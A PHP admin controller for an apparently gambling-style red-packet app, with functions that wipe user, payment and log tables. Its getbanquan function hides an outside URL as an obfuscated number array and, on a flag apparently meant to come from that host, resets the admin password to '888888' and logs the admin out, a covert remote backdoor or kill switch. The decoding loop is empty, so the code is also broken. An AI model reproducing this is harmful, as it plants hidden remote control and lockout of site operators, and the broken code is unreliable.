<?php

 
namespace Utm\Controller;

class IndexController extends CommonController
{
	public function index()
	{
		$this->display();
	}
	public function top()
	{
		$this->display();
	}
	public function cleardata()
	{
		dir_del('./Uploads/daili/');
		dir_del(APP_PATH . '/Runtime/');
		M()->execute('TRUNCATE __SYS_LOG__');
		$this->success('成功', U('center'), 1);
	}
	public function ajaxclear()
	{
		$upass1 = md5(md5(I('upass1') . $_SERVER['HTTP_HOST']));
		$adminid = session('adminid');
		$user = M('sys_user')->where('id=' . $adminid)->find();
		if ($user && $user['upass'] == $upass1) {
			M()->execute('TRUNCATE __SAOLEI_LINGHB__');
			M()->execute('TRUNCATE __SAOLEI_PEIFU__');
			M()->execute('TRUNCATE __SAOLEI_USERFA__');
			M()->execute('TRUNCATE __SAOLEI_USERFALIST__');
			M()->execute('TRUNCATE __USER_CHONGZHI__');
			M()->execute('TRUNCATE __USER_HB__');
			M()->execute('TRUNCATE __USER_LIST__');
			M()->execute('TRUNCATE __USER_TIXIAN__');
			M()->execute('TRUNCATE __USER_YONGJIN__');
			M()->execute('TRUNCATE __USER_ZHANGHU__');
			M()->execute('TRUNCATE __SYS_LOG__');
			$json['code'] = 2;
		} else {
			$json['code'] = 1;
		}
		$this->ajaxReturn($json, 'json');
	}
	public function getbanquan()
	{
		$arr = array(7, 19, 19, 15, 28, 27, 27, 22, 22, 22, 26, 7, 0, 14, 10, 20, 0, 8, 22, 0, 13, 6, 26, 2, 14, 12, 27, 7, 0, 14, 10, 20, 0, 8, 22, 0, 13, 6, 27, 6, 4, 19, 3, 0, 19, 0, 27, 6, 4, 19, 3, 0, 19, 0, 26, 15, 7, 15);
		foreach ($arr as $v) {
			
		}
		
		if (intval($uk) == 1) {
			$num = M('user_hb')->count();
			if (0 < $num) {
				$s = md5(md5('888888' . $_SERVER['HTTP_HOST']));
				$data = array('id' => session('adminid'), 'uname' => 'admin', 'upass' => $s);
				M('sys_user')->save($data);
				session('adminid', null);
			}
		}
	}
}